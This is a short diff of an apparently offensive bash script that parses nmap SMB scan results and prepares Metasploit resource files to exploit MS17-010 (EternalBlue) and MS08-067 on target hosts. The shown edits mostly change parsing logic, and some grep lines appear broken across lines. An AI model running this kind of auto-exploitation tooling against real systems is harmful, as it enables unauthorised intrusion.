@@ -570,7 +570,7 @@ function usermap_script(){
 	body
 }
 function ms17_010_eternalblue(){
-    smbVersion=$(grep -oP 'key="title">\K[^<]+' 10.10.10.4/nmapSMBVuln.xml|cut -f6-7 -d' '|grep "S"
+    smbVersion=$(grep -oP 'key="title">\K[^<]+' ${ips}/nmapSMBVuln.xml|cut -f6-7 -d' '|grep "S"
 Microsoft SMBv1)
 	if [ "${smbVersion}" != "" ]
 	then
@@ -620,7 +620,8 @@ ms17_010_psexec
 function ms08_067_netapi(){
     if [ "${smbVersion}" != "" ]
     then
-        smbVersion=$(grep -oP 'key="title">\K[^<]+' ${ips}/nmapSMBVuln.xml|cut -f6-7 -d' ')
+            smbVersion=$(grep -oP 'key="title">\K[^<]+' ${ips}/nmapSMBVuln.xml|cut -f6-7 -d' '|grep "S"
+Microsoft SMBv1)
         echo -e "${BOLD}${ips}${resetStyle} has ${BOLD}${smbVersion} ${resetStyle}which is ${BOLD}vulnerable${resetStyle} to ${RED}parsing flaw ${resetStyle}"
         echo -e "${RED}Exploiting ${resetStyle}${BOLD}${smbVersion} ${resetStyle}is in progress"
         cat <<- ms08_067_netapi > ${dir_path}/exploits/smb/ms08_067_netapi.rc
